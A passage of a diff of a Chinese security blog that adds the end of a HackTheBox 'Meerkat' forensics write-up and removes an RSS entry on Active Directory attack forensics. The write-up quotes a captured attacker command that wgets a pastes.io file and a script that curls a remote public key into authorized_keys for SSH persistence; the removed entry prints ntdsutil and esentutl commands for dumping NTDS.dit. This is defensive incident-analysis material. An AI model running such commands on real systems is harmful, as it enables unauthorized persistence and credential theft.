+</span></span><span style="display:flex;"><span>Keep-Alive: timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;p&#34;</span>:<span style="color:#e6db74">&#34;0&#34;</span>,<span style="color:#e6db74">&#34;c&#34;</span>:<span style="color:#e6db74">&#34;1&#34;</span>,<span style="color:#e6db74">&#34;cmd&#34;</span>:<span style="color:#e6db74">&#34;wget https://pastes.io/raw/bx5gcr0et8&#34;</span>,<span style="color:#e6db74">&#34;out&#34;</span>:<span style="color:#e6db74">&#34;--2023-01-19 15:38:52--  https://pastes.io/raw/bx5gcr0et8\nResolving pastes.io (pastes.io)... 66.29.132.145\nConnecting to pastes.io (pastes.io)|66.29.132.145|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 113 [text/plain]\nSaving to: \u2018bx5gcr0et8\u2019\n\n     0K                                                       100% 57.8M=0s\n\n2023-01-19 15:38:53 (57.8 MB/s) - \u2018bx5gcr0et8\u2019 saved [113/113]\n\n&#34;</span>,<span style="color:#e6db74">&#34;currentDate&#34;</span>:<span style="color:#e6db74">&#34;2023-01-19&#34;</span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><ol>
+<li><strong>Please provide the filename of the public key used by the attacker to gain persistence on our host.</strong></li>
+</ol>
+<p>找到这个网站</p>
+<p><a href="https://web.archive.org/web/20230323143358/https://pastes.io/raw/bx5gcr0et8">https://web.archive.org/web/20230323143358/https://pastes.io/raw/bx5gcr0et8</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>curl https://pastes.io/raw/hffgra4unv &gt;&gt; /home/ubuntu/.ssh/authorized_keys
+</span></span><span style="display:flex;"><span>sudo service ssh restart
+</span></span></code></pre></div><p><code>hffgra4unv</code> 就是<strong>主机上获得持久性的公钥的文件名</strong></p>
+<ol>
+<li><strong>Can you confirm the file modified by the attacker to gain persistence?</strong></li>
+</ol>
+<p>由题8可知为了<strong>持久性而修改的文件为</strong>  <code>/home/ubuntu/.ssh/authorized_keys</code></p>
+<ol>
+<li><strong>Can you confirm the MITRE technique ID of this type of persistence mechanism?</strong></li>
+</ol>
+<p><code>T1098.004</code>通过修改 SSH 的 <code>authorized_keys</code> 文件来维持对受害主机的持久访问权限</p>
+<p><a href="https://attack.mitre.org/techniques/T1098/004/">https://attack.mitre.org/techniques/T1098/004/</a></p>
+</div>
+    <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/soc"
+        rel="tag"
+        >SOC</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap article-nav-link-left"><img
+              data-src="images/c.jpg"
+              data-sizes="auto"
+              alt="HTB Pikaptcha"
+              class="lazyload"
+            /><a href="/post/htb-pikaptcha/"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">HTB Pikaptcha</h3>
+      </div></nav></article></section>
+        </div><footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2020-2025<span class="footer-info-sep rotate"></span>
+      Wuvoun
+    </div><div>
+        Powered by&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          >Hugo</a
+        >&nbsp; Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;4.0k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;00:20</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >Number of visits&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >Number of visitors&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class">
+    <nav id="TableOfContents"></nav>
+  </div>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/../images/avatar.webp"
+    data-sizes="auto"
+    alt="Wuvoun"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Wuvoun</div>
+  <div class="sidebar-description">少女祈祷中...</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div><div class="sidebar-state-number">4</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>Categories</div>
+    <div class="sidebar-state-number">
+      2
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>Tags</div>
+    <div class="sidebar-state-number">4</div>
+  </a>
+</div>
+<div class="sidebar-social"></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="Home"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">Home</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="Archives"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="About"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">About</div>
+    </div></div>
+</div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" integrity="" crossorigin="anonymous" ></script><script src="/js/aos.js" integrity="" crossorigin="anonymous" ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" integrity="" crossorigin="anonymous" data-pjax></script><script
+    src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js"
+    integrity="sha384-8LyaidD9GPxQQgLJO/WRw/O2h3BoNq/ApI/ecpvM6RsrCz2qP2ppBXUKihP4V/2d" crossorigin="anonymous"></script><script>
+  if (window.firework) {
+    const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+    options.excludeElements = options.excludeelements;
+    delete options.excludeelements;
+    window.firework(options);
+  }
+</script>
 
-    <item>
-      <title>AD攻击取证</title>
-      <link>https://wuvoun.github.io/post/ad%E6%94%BB%E5%87%BB%E5%8F%96%E8%AF%81/</link>
-      <pubDate>Tue, 26 Aug 2025 15:04:24 &#43;0800</pubDate>
-      <author>253567768@qq.com (Wuvoun)</author>
-      <guid>https://wuvoun.github.io/post/ad%E6%94%BB%E5%87%BB%E5%8F%96%E8%AF%81/</guid>
-      <description>
-        <![CDATA[<h1>AD攻击取证</h1><p>Author: Wuvoun(253567768@qq.com)</p>
-        
-          <h1 id="active-directory-攻击取证">
-<a class="header-anchor" href="#active-directory-%e6%94%bb%e5%87%bb%e5%8f%96%e8%af%81"></a>
-Active Directory 攻击取证
-</h1><h2 id="检测-ntdsdit-转储">
-<a class="header-anchor" href="#%e6%a3%80%e6%b5%8b-ntdsdit-%e8%bd%ac%e5%82%a8"></a>
-检测 NTDS.dit 转储
-</h2><ul>
-<li>
-<p>事件 7036</p>
-<p>用来记录 <strong>Windows 服务状态的变化,</strong>
-如果在日志里发现一些敏感服务被异常启动/停止（如 <em>Remote Registry</em>, <em>WinRM</em>, <em>Telnet</em> 等），就要警惕是否有人在进行横向移动或远程控制。</p>
-</li>
-</ul>
-<h3 id="使用-ntdsutil-或-windows-内置功能">
-<a class="header-anchor" href="#%e4%bd%bf%e7%94%a8-ntdsutil-%e6%88%96-windows-%e5%86%85%e7%bd%ae%e5%8a%9f%e8%83%bd"></a>
-使用 <strong>ntdsutil</strong> 或 Windows 内置功能
-</h3><ul>
-<li>转储指令</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ntdsutil <span style="color:#e6db74">&#34;activate instance ntds&#34;</span> <span style="color:#e6db74">&#34;ifm&#34;</span> <span style="color:#e6db74">&#34;create full C:\ntdsbackup&#34;</span> quit quit
-</span></span></code></pre></div><ul>
-<li>取证</li>
-</ul>
-<p><code>Security.evtx</code> → <strong>4688 (Process Creation)</strong></p>
-<p>存在进程  <em><strong>ntdsutil.exe</strong></em>
-存在指令  <em><strong>ntdsutil &ldquo;activate instance ntds&rdquo; &ldquo;ifm&rdquo; &hellip;</strong></em></p>
-<p>在 IFM 创建数据库副本的过程中，<strong>系统为了避免复制时 NTDS.dit 处于写入状态</strong>，后台会通过 <strong>NTDS 服务调用 Windows 的快照机制</strong> 来生成一个一致性的副本，然后再从快照中提权ntds, 所以会从日志中发现Volume Shadow Copy</p>
-<h3 id="使用-esentutl">
-<a class="header-anchor" href="#%e4%bd%bf%e7%94%a8-esentutl"></a>
-<strong>使用 esentutl</strong>
-</h3><ul>
-<li>
-<p><strong>转储指令</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>esentutl /y C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\N</span>TDS<span style="color:#ae81ff">\n</span>tds.dit /d C:<span style="color:#ae81ff">\e</span>vidence<span style="color:#ae81ff">\n</span>tds_copy.dit
-</span></span></code></pre></div><p>（<code>/y</code> = copy，<code>/d</code> = 转储路径，通常还加 <code>/vss</code> 参数）</p>
-        
-        <hr><p>Published on 2025-08-26 at <a href='https://wuvoun.github.io/'>Wuvoun</a>, last modified on 2025-08-26</p>]]>
-      </description>
-      
-        <category>取证</category>
-      
-    </item>
-    
-  </channel>
-</rss>
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "Wuvoun",
+          title: "HTB Meerkat",
+          url: "https:\/\/wuvoun.github.io\/post\/htb-meerkat\/",
+          description: "\rHTB-Meerkat\r提供了一个流量包和meerkat-alerts.json文件，先分析meerkat-alerts.json文件，提取报警信息\njq -r \u0026#39;.[].alert.signature\u0026#39; meerkat-alerts.json ET CINS Active Threat Intelligence Poor Reputation IP group 82 ET DROP Dshield Block Listed Source group 1 ET DROP Dshield Block Listed Source group 1 ET POLICY …",
+          cover: "https:\/\/wuvoun.github.io\/images\/banner.png",
+        };
+      </script><script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script></div>
+</div><script
+    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
+    asyncintegrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"></script><script>
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        for (let registration of registrations) {
+          registration.unregister();
+        }
+      });
+    }
+  </script><script>
+  const reimuCopyright = String.raw`
+   ______     ______     __     __    __     __  __    
+  /\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+  \ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+   \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+    \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                    
+  `;
+  console.log(String.raw`%c ${reimuCopyright}`, "color: #ff5252;");
+  console.log(
+    "%c Theme.Reimu" + " %c https://github.com/D-Sketon/hugo-theme-reimu ",
+    "color: white; background: #ff5252; padding:5px 0;",
+    "padding:4px;border:1px solid #ff5252;",
+  );
+</script></body>
+</html>
